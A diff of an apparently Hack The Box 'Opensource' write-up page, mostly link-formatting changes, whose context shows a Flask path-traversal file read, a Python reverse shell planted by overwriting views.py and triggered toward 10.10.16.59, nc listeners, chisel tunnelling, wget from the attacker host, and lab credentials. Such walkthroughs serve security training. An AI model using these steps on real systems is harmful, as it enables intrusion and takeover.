@@ -25,7 +25,7 @@
 
 
 
-<link rel="stylesheet" href="/main.95aad797b4ac37875a27d7418e1f17962c12ae6eba2ef3abc677cd14fad7fc5e.css">
+<link rel="stylesheet" href="/main.653e12f307c49620b5b1ba68d8bf5a05c6ab0038af0589bca65686d5dbc02602.css">
 
 
 
@@ -161,7 +161,9 @@ if (!doNotTrack) {
           <img src="https://www.hackthebox.com/storage/avatars/789e24a78e57e307944d8dbbde67cc32.png" alt="Opensource Write-Up" />
           
           
-            <figcaption class="center">Machine created by <a href="https://app.hackthebox.com/users/476556">irogir</a></figcaption>
+            <figcaption class="center">Machine created by 
+
+<a href="https://app.hackthebox.com/users/476556" target="_blank">irogir</a></figcaption>
           
         </figure>
       
@@ -311,7 +313,11 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Wed Jul 27 03:08:39 2022 -- 1 IP address (1 host up) scanned in 129.97 seconds</span>
 </span></span></code></pre></div><p>I can see 2 opens ports <em>(22, 80)</em> with a third <em>(3000)</em> that appears to be filtered meaning that some sort of firewall is blocking the reply back.</p>
-<p>Looking at port <em>80</em>, the banner tells us that its a python/3.10.3 based <a href="https://wsgi.readthedocs.io/en/latest/what.html"><em>WSGI</em></a> web application: <a href="https://werkzeug.palletsprojects.com/en/2.1.x/"><em>Werkzeug/2.1.2</em></a></p>
+<p>Looking at port <em>80</em>, the banner tells us that its a python/3.10.3 based 
+
+<a href="https://wsgi.readthedocs.io/en/latest/what.html" target="_blank"><em>WSGI</em></a> web application: 
+
+<a href="https://werkzeug.palletsprojects.com/en/2.1.x/" target="_blank"><em>Werkzeug/2.1.2</em></a></p>
 <p>By surfing the home page on port 80, I can see two buttons, one to download the source code for a certain application and the other one to go to a page where you can upload a file.</p>
 <p><img src="exploring-home-page.png" alt="Exploring the Home Page"></p>
 <h3 id="exploring-the-source-code">Exploring the Source Code</h3>
@@ -512,7 +518,9 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> search
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(search<span style="color:#f92672">.</span>replace(replace_me, with_me), replace_me, with_me)
 </span></span></code></pre></div><p>It appears that there are 2 functions, <em>get_file_name</em> (unsafe) and <em>get_unique_upload_name</em> (considered by the developer safe) but is not yet implemented. This code here uses the unsafe <em>get_file_name</em> that calls <em>recursive_replace</em> function which replaces <em>../</em> string with nothing, and since it is recusivly doing that, there is no way to get arround it.</p>
-<p>However in the <em>app/app/views.py</em> this function is called, then its output is passed to the <em>os.path.join</em> function, then to the <em>send_file</em> function from <a href="https://github.com/pallets/flask"><em>Flask</em></a> which will return the content of the file.</p>
+<p>However in the <em>app/app/views.py</em> this function is called, then its output is passed to the <em>os.path.join</em> function, then to the <em>send_file</em> function from 
+
+<a href="https://github.com/pallets/flask" target="_blank"><em>Flask</em></a> which will return the content of the file.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>views<span style="color:#f92672">.</span>py 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
@@ -544,14 +552,20 @@ if (!doNotTrack) {
 <p>For this I will try to upload a file first and then access it to make sure that everything is normal and the application is taking my file and storing it somewhere.</p>
 <p><img src="trying-to-upload-normal-file.png" alt="Uploading Normal file"></p>
 <p>Looks like this application is not using a function like <em>get_unique_upload_name</em> because the name of the uploaded file is the same.</p>
-<p>Now I will try the <em>Local File Inclusion</em> payload using <a href="https://portswigger.net/burp"><em>Burp Suite</em></a>:</p>
+<p>Now I will try the <em>Local File Inclusion</em> payload using 
+
+<a href="https://portswigger.net/burp" target="_blank"><em>Burp Suite</em></a>:</p>
 <p><code>uploads//etc/passwd</code></p>
 <p><img src="Initial-LFI-try.png" alt="LFI Initial Try"></p>
-<p>Looks like I got redirected. After playing a little bit with <a href="https://github.com/pallets/flask"><em>Flask</em></a> localy, I noticed that this is a nomral behavior in it, if the url path contained something like <em>uploads//something/here</em> it will redirect it to <em>uploads/something/here</em> then will process this new request.</p>
+<p>Looks like I got redirected. After playing a little bit with 
+
+<a href="https://github.com/pallets/flask" target="_blank"><em>Flask</em></a> localy, I noticed that this is a nomral behavior in it, if the url path contained something like <em>uploads//something/here</em> it will redirect it to <em>uploads/something/here</em> then will process this new request.</p>
 <p>To avoid this, I can make use fo the <em>get_file_name</em> being called to check for <em>../</em> string and remove it:</p>
 <ul>
 <li>First, I will request the path <em>uploads/..//etc/passwd</em></li>
-<li><a href="https://github.com/pallets/flask"><em>Flask</em></a> will not redirect this request because the path is not <em>uploads//</em></li>
+<li>
+
+<a href="https://github.com/pallets/flask" target="_blank"><em>Flask</em></a> will not redirect this request because the path is not <em>uploads//</em></li>
 <li>Then it will call the <em>get_file_name</em> function on <em>..//etc/passwd</em> which will remove <em>../</em> and return <em>/etc/passwd</em></li>
 <li>Finally <em>/etc/passwd</em> string will pass to the <em>os.path.join</em> function as parameter and will result in <em>/etc/passwd</em> being the file read</li>
 </ul>
@@ -613,11 +627,17 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
 </span></span><span style="display:flex;"><span>    pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
 </span></span></code></pre></div><ul>
-<li>Code for reverse shell taken from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">PayloadsAllTheThings</a></li>
+<li>Code for reverse shell taken from 
+
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python" target="_blank">PayloadsAllTheThings</a></li>
 </ul>
-<p>I&rsquo;ll intercept the upload file request using <a href="https://portswigger.net/burp"><em>Burp Suite</em></a> and change the filename:</p>
+<p>I&rsquo;ll intercept the upload file request using 
+
+<a href="https://portswigger.net/burp" target="_blank"><em>Burp Suite</em></a> and change the filename:</p>
 <p><img src="overriding-views-file.png" alt="Overwriting views.py with malicious code"></p>
-<p>Now let&rsquo;s get a reverse shell by navigating the to newly created view, <em><a href="http://opensource.htb/revShell/10.10.16.59/8989">http://opensource.htb/revShell/10.10.16.59/8989</a></em></p>
+<p>Now let&rsquo;s get a reverse shell by navigating the to newly created view, <em>
+
+<a href="http://opensource.htb/revShell/10.10.16.59/8989" target="_blank">http://opensource.htb/revShell/10.10.16.59/8989</a></em></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span>
 </span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8989</span> ...
 </span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.59<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.164<span style="color:#f92672">]</span> <span style="color:#ae81ff">52332</span>
@@ -678,9 +698,13 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
 </span></span><span style="display:flex;"><span>Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>a0f2435183e3d93a; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
 </span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">05</span> Oct <span style="color:#ae81ff">2022</span> 15:11:22 GMT
-</span></span></code></pre></div><p>I got a response, and by reading the session cookie I can tell that this application is <a href="https://gitea.io/en-us/"><em>Gitea</em></a>.</p>
+</span></span></code></pre></div><p>I got a response, and by reading the session cookie I can tell that this application is 
+
+<a href="https://gitea.io/en-us/" target="_blank"><em>Gitea</em></a>.</p>
 <h3 id="getting-user-on-the-host-machine">Getting User On the Host Machine</h3>
-<p>I&rsquo;ll upload <a href="https://github.com/jpillora/chisel/releases"><em>chisel</em></a> to the victim machine and <em>port forward</em> the port <em>3000</em> to my local attacking machine.</p>
+<p>I&rsquo;ll upload 
+
+<a href="https://github.com/jpillora/chisel/releases" target="_blank"><em>chisel</em></a> to the victim machine and <em>port forward</em> the port <em>3000</em> to my local attacking machine.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server
 </span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
 </span></span><span style="display:flex;"><span>10.10.11.164 - - <span style="color:#f92672">[</span>06/Oct/2022 06:31:47<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /chisel_1.7.7_linux_amd64 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
@@ -689,7 +713,9 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>saving to <span style="color:#e6db74">&#39;chisel_1.7.7_linux_amd64&#39;</span>
 </span></span><span style="display:flex;"><span>chisel_1.7.7_linux_a 100% |********************************| 7888k  0:00:00 ETA
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;chisel_1.7.7_linux_amd64&#39;</span> saved
-</span></span></code></pre></div><p>On my attacking machine, I&rsquo;ll run a server instance of <a href="https://github.com/jpillora/chisel/releases"><em>chisel</em></a> that will listen on port 9001, then I&rsquo;ll connect to it from the victim machine and forward the connection of <em>http://172.17.0.1:3000/</em> accessible only from this machine to mine.</p>
+</span></span></code></pre></div><p>On my attacking machine, I&rsquo;ll run a server instance of 
+
+<a href="https://github.com/jpillora/chisel/releases" target="_blank"><em>chisel</em></a> that will listen on port 9001, then I&rsquo;ll connect to it from the victim machine and forward the connection of <em>http://172.17.0.1:3000/</em> accessible only from this machine to mine.</p>
 <ul>
 <li>On the attacker:
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p <span style="color:#ae81ff">9001</span> --reverse
@@ -703,7 +729,9 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>2022/10/06 03:51:02 client: Connected <span style="color:#f92672">(</span>Latency 81.014967ms<span style="color:#f92672">)</span>
 </span></span></code></pre></div></li>
 </ul>
-<p>I can now access <a href="https://gitea.io/en-us/"><em>Gitea</em></a> from my attacking machine using firefox on <em>http://127.0.0.1:3000/</em></p>
+<p>I can now access 
+
+<a href="https://gitea.io/en-us/" target="_blank"><em>Gitea</em></a> from my attacking machine using firefox on <em>http://127.0.0.1:3000/</em></p>
 <p><img src="accessing-gitea.png" alt="Accessing Gitea From My Machine"></p>
 <p>Now I&rsquo;ll use the previous credentials <em>dev01:Soulless_Developer#2022</em> to try to login to this instance.</p>
 <p><img src="discovering-home-dir-backup.png" alt="Loging In To Gitea"></p>
@@ -790,7 +818,9 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>6c4**************************c7c
 </span></span><span style="display:flex;"><span>dev01@opensource:~$ 
 </span></span></code></pre></div><h2 id="post-enumeration">Post Enumeration</h2>
-<p>I&rsquo;ll use <a href="https://github.com/DominicBreuker/pspy#download"><em>pspy</em></a> to snoop on running processes and see if I can get anything about root.</p>
+<p>I&rsquo;ll use 
+
+<a href="https://github.com/DominicBreuker/pspy#download" target="_blank"><em>pspy</em></a> to snoop on running processes and see if I can get anything about root.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ wget http://10.10.16.59:8000/pspy64 
 </span></span><span style="display:flex;"><span>--2022-10-06 07:52:21--  http://10.10.16.59:8000/pspy64
 </span></span><span style="display:flex;"><span>Connecting to 10.10.16.59:8000... connected.
